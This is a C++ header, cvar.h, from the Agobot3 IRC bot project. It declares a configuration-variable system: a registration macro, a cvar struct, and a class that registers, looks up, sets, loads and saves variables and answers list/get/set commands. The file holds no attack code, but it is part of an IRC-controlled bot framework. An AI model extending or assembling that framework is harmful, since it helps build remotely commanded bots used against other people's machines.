/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __CVAR_H__
#define __CVAR_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"

using namespace std;

class CCommandHandler;

// Params: a=var/name, b=default, c=description, d=save, e=key
#define REGCVAR(a, b, c, d, e) g_pMainCtrl->m_cCVar.RegisterCvar(&a, #a, b, c, d, e);

typedef struct cvar_s
{	CString	sValue;
	float	fValue;
	bool	bValue;
	int		iValue;
    CString	sName;
    CString	sDescription;
	bool	bSave;
	bool	bDynamic;
} cvar;

class CCVar : public CCommandHandler
{
public:
	CCVar();
	~CCVar();
	void Init();

	void RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, const CString &sDescription, bool bSave, char *szKey=NULL);
	void RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, const char *szDescription, bool bSave, char *szKey=NULL);

	cvar *TempCvar(const CString &sName, const CString &sValue, char *szKey=NULL);
	cvar *TempCvar(const char *szName, const char *szValue, char *szKey=NULL);

	cvar *FindCvarByName(const CString &sName, bool bExact);
	cvar *FindCvarByName(const char *szName, bool bExact);

	bool ParseConfig(const CString &sFilename);
	bool ParseConfig(const char *szFilename);

	bool SaveConfig(const CString &sFilename);
	bool SaveConfig(const char *szFilename);

	void SetCVar(cvar *pCvar, const char *szValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, const CString &sValue);
	void SetCVar(cvar *pCvar, float fValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, bool bValue, char *szKey=NULL);
	void SetCVar(cvar *pCvar, int iValue, char *szKey=NULL);

	bool HandleCommand(CMessage *pMsg);
	command m_cmdList, m_cmdGet, m_cmdSet, m_cmdLoadConfig, m_cmdSaveConfig;
protected:
	list<cvar*> m_lCvars;
};

#endif // __CVAR_H__
